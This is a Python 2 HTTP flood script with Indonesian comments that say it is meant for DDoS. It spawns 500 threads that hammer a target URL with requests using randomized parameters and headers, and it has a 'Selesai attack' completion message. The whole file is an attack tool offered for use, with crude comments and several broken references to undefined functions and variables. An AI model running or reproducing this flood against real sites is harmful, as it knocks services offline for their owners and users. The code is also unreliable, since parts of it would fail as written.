#script ini dibuat oleh Dev dari oneevolution
#segala bentuk pencurian/klaim saya gedik!
#berguna untuk ddos :D

import os,urllib2,sys,threading,random,re

os.system("figlet Dev ddos")

#=======batas suci hehe :D=========
flag=0
safe=0
#userkontol="root"
link=''
host=''
header_agent=[]
header_ref=[]
reqcounter=0
#=======ini penting gan===========
wait = {
      "userkontol":"notroot",
      "access":"no access"
}

def access():
        wait["userkontol"] = "notroot"
        print (str(wait["userkontol"]))

def access3():
        wait["userkontol"] = "root"

#=======Bentar gan========#

def inc_count():
        global reqcounter
        reqcounter+=1

def setflag():
        global flag
        flag=val

def headlist():
        global header_agent
        header_agent.append('Mozilla/5.0 (X11; U; Linux amd64; rv:5.0) Gecko/20100101 Firefox/5.0 (Debian)')
        header_agent.append('Kontol/5.0')
        return header_agent

def reflist():
        global header_ref
        header_ref.append('https://google.co.id/?q=')

def crblock(size):
        tp_str = ''
        for i in range(0, size):
                bck = random.randint(65, 90)
                tp_str = chr(bck)
        return (tp_str)

def pemakaian():
        print("Cara memakainya adalah,python (name) web/ip")

def httpcall(link):
        headlist()
        reflist()
        code=0
        if url.count("?")>0:
                param_joiner="&"
        else:
                param_joiner="?"
        request = urllib2.Request(url + param_joiner + crblock(random.randint(3,10)) + '=' + crblock(random.randint(3,10)))
	request.add_header('User-Agent', random.choice(header_agent))
	request.add_header('Cache-Control', 'no-cache')
	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
	request.add_header('Referer', random.choice(head) + crblock(random.randint(5,10)))
	request.add_header('Keep-Alive', random.randint(110,120))
	request.add_header('Connection', 'keep-alive')
	request.add_header('Host',host)
        try:
           urllib2.urlopen(request)
        except:
            pass


class HTTPThread(threading.Thread):
        def run(self):
                try:
                        while flag<2:
                                code=httpcall(url)
                                if (code==500) & (safe==1):
                                        set_flag(2)
                except Exception, ex:
                        pass

class MonitorThread(threading.Thread):
        def run(self):
                previous=reqcounter
                while flag==0:
                        if (previous+100<reqcounter) & (previous<>reqcounter):
                                print "%d Permintaan" % (reqcounter)
                                previous=reqcounter
                if flag==2:
                        print "Selesai attack"

      
if len(sys.argv) < 2:
	pemakaian()
	sys.exit() 
else:
        if sys.argv[1]=="info":
                os.system("Dibuat oleh OneEvolution")
                os.system("DILARANG COPYPASTE!")
        if sys.argv[1]=="-croot":
                try:
                   access()
                except:
                    os.system("mkdir backup && cp * backup")

	if sys.argv[1]=="-h":
                sistem = sys
		pemakaian()
		sistem.exit()
	else:
                print "IM CONNECTING"
		print "Loading....."
                print "starting....."
                print("TRY()BOOM\n" * 55)
                print("Try to connecting..." * 60 )
                os.system("clear")
                print(" " * 999)
                print("wait,if something showin")
                print("your url is right :D")
		if len(sys.argv)== 3:
			if sys.argv[2]=="-s":
				set_safe()
		url = sys.argv[1]
		if url.count("/")==2:
			url = url + "/"
		lala = re.search('(https?\://)?([^/]*)/?.*', url)
		host = lala.group(2)
		for i in range(500):
			t = HTTPThread()
			t.start()
		t = MonitorThread()
                t.start()


#ENDING NYA GAN,CAPEK ANJIR GAN !

